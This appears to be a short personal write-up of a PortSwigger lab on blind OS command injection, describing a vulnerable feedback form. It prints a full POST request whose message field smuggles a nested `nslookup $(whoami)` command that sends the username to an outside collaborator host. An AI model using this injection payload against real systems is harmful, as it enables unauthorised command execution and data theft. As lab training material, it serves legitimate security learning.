#  Blind OS command injection with out-of-band data exfiltration— (PortSwigger — Practitioner)
**Date:** 2026-08-22
 
---
 
## Vulnerability / core concept
Blind OS Command Injection

---


## Payload / key command
This web application has a `Submit feedback` feature which is vulnerable to OS command injection. However, it does not display any signs of successful injection which makes finding this vulnerability very subtle.

To exploit it, we should send DNS lookup to our Burp Collaborator. We can do this by sending the following POST `/feedback/submit` request:
```bash
POST /feedback/submit HTTP/2
...

csrf=oIjDQiwGGxw366WyketZ0YvksPJbOmtU&name=babek&email=babek%40babek&subject=testing&message=hello+$(nslookup+$(whoami).t603zjh2vt09rzim32ebycg970dr1mpb.oastify.com)
```
Here, `$(nslookup $(whoami).collaborator)` is a nested substitution where `$(whoami)` is evaluated first by shell, then `nslookup`. After evalating, the result of these commands will be used by the original system command of this application.


